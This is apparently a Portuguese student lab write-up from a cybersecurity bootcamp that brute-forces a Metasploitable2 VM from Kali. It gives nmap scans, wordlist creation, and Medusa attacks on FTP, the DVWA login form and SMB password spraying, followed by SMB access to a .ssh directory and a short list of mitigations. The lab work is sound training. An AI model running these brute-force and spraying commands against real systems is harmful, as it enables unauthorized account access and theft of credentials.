# Atack-Brute-force-lab

# Desafio DIO — Kali + Medusa + Metasploitable2

## Resumo
Objetivo desse teste é aprimorar meu conhecimento nas  ferramentas utilizadas.  
todo conteudo desse laboratorio é  do desafio do bootcamp Santander ciber segurança 2025 na plataforma DIO. 

## Ambiente
- Kali Linux (IP: 192.168.56.102)
- Metasploitable2 (IP: 192.168.56.103)
- Rede: VirtualBox Host-Only

## Ferramentas

medusa – ataques de força-bruta (FTP, HTTP, SMB)

nmap – descoberta de hosts e serviços

enum4linux – enumeração SMB

smbclient – acesso e validação de compartilhamentos SMB

hydra 
ftp 

crunch – geração de wordlists 

# criar users.txt
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

# criar pass.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

Testes e comandos
1) Enumeração
Descoberta de hosts
nmap -sn 192.168.56.0/24
Scan completo do alvo (ports & services)
nmap -sS -sV -p- -T4 192.168.56.103 -oN nmap_full_192.168.56.103.txt

Criar wordlists / arquivos de usuários e senhas

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
(opcional smb lists)
echo -e "msfadmin\nadmin\nuser" > users_smb.txt
echo -e "msfadmin\npassword\n123456" > pass_smb.txt
chmod 600 users.txt pass.txt users_smb.txt pass_smb.txt
Ataque 1 — Brute force FTP (Medusa)


2) FTP — medusa
medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 8
Validação FTP (cliente):
ftp 192.168.56.103
# autenticar com msfadmin:msfadmin

Ataque 2 — Brute force em formulário web (DVWA) — Medusa (http form)


medusa -h 192.168.56.103 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6

Validação (navegador):

http://192.168.56.103/dvwa/
Credenciais encontradas: Admin:password





3) Ataque 3 — SMB: enumeração + password spraying (Medusa)
Enumeração SMB (salvar output):
enum4linux -a 192.168.56.103 > enum_smb_192.168.56.103.txt

Listar shares (sem credenciais):
smbclient -L //192.168.56.103 -N
Password spraying (muitos usuarios × poucas senhas):
medusa -h 192.168.56.103 -U users_smb.txt -P pass_smb.txt -M smbnt -t 10
Validação com credenciais encontradas:
smbclient -L //192.168.56.103 -U msfadmin%msfadmin
# acessar share e listar arquivos
smbclient //192.168.56.103/msfadmin -U msfadmin%msfadmin
# dentro do smbclient:
cd .ssh
ls
exemplos utilizados : Credenciais encontradas: msfadmin:msfadmin — foi possível listar .ssh e arquivos internos.

## Mitigações recomendadas
- Habilitar bloqueio de contas / lockout depois de X tentativas.
- Implementar MFA.
- Rate limiting e WAF para formulários web.
- Desabilitar serviços desnecessários, usar SFTP / FTPS.
- Habilitar SMB signing, desabilitar SMBv1.

## Repositório
- /images
- /wordlists
- commands.txt
